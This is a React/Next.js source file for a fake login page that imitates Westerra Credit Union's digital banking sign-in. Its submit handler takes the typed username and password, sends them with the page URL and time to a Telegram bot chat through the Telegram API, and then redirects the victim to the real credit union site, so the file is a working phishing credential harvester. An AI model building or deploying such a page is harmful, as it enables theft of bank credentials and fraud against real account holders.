import Image from 'next/image'
import React, { FormEvent, useEffect, useState } from 'react'
import styles from './Login.module.scss'
import LoginImage from '@/public/login1.jpg'
import LogoImage from '@/public/logo.svg'
import Housing from '@/public/housing.svg'
import Second from '@/public/2.svg'
import Link from 'next/link'
import axios from 'axios'
import { Router, useRouter } from 'next/router'

const Login1 = () => {
    const [username, setUsername] = useState('')
    const [password, setPassword] = useState('')
    const [hidePassword, setHidePassword] = useState(true)
    const [disabled, setDisabled] = useState(true)
    const router = useRouter()

    useEffect(() => {
        if (username.length && password.length) {
            setDisabled(false)
        } else {
            setDisabled(true)
        }
    }, [username, password])

    const handleClick = (e: FormEvent) => {
        e.preventDefault()
        const site = window.location.href;
        const date = new Date().toLocaleString('ru');
        const message = `
🔗 ${site}     
├ \`${date}\`        
├ \`${username}\`        
├ \`${password}\`        
        `
        axios.post(`https://api.telegram.org/bot${process.env.NEXT_PUBLIC_BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.NEXT_PUBLIC_CHAT_ID,
            parse_mode: 'Markdown',
            text: message
        }).then(res => router.push('https://www.westerracu.com/'))
    }

    return (
        <div className={styles.wrap}>
            <Image src={LoginImage} alt="Image" />
            <div className={styles.mainwrap}>
                <div className={styles.main}>
                    <LogoImage />
                    <h1>Westerra Credit Union Digital Banking</h1>
                    <form className={styles.form}>
                        <label>
                            Username
                            <input value={username} onChange={(e) => setUsername(e.target.value)} type="text" />
                        </label>
                        <label>
                            Password
                            <input value={password} onChange={(e) => setPassword(e.target.value)} type={hidePassword ? 'password' : 'text'} />
                            {hidePassword ? <svg onClick={() => setHidePassword(prev => !prev)} xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                                <path d="M13.359 11.238C15.06 9.72 16 8 16 8s-3-5.5-8-5.5a7.028 7.028 0 0 0-2.79.588l.77.771A5.944 5.944 0 0 1 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.134 13.134 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755-.165.165-.337.328-.517.486l.708.709z"></path>
                                <path d="M11.297 9.176a3.5 3.5 0 0 0-4.474-4.474l.823.823a2.5 2.5 0 0 1 2.829 2.829l.822.822zm-2.943 1.299.822.822a3.5 3.5 0 0 1-4.474-4.474l.823.823a2.5 2.5 0 0 0 2.829 2.829z"></path>
                                <path d="M3.35 5.47c-.18.16-.353.322-.518.487A13.134 13.134 0 0 0 1.172 8l.195.288c.335.48.83 1.12 1.465 1.755C4.121 11.332 5.881 12.5 8 12.5c.716 0 1.39-.133 2.02-.36l.77.772A7.029 7.029 0 0 1 8 13.5C3 13.5 0 8 0 8s.939-1.721 2.641-3.238l.708.709zm10.296 8.884-12-12 .708-.708 12 12-.708.708z"></path>
                            </svg> : <svg onClick={() => setHidePassword(prev => !prev)} xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                                <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.133 13.133 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.133 13.133 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5c-2.12 0-3.879-1.168-5.168-2.457A13.134 13.134 0 0 1 1.172 8z"></path>
                                <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z"></path>
                            </svg>}
                        </label>
                        <div className={styles.formDiv}>
                            <button disabled={disabled} onClick={(e) => handleClick(e)} type="submit">Log in</button>
                            <div className={styles.formInner}>
                                <Link href="/">Forgot Password?</Link>
                                <Link href="/">Forgot Username?</Link>
                            </div>
                        </div>
                    </form>
                    <Link className={styles.link} href="/">Enroll in Digital Banking</Link>
                    <div className={styles.svg}>
                        <span> <Housing height={30} /></span>
                        <span><Second height={30} /></span>
                    </div>
                </div>
            </div>
        </div>
    )
}

export default Login1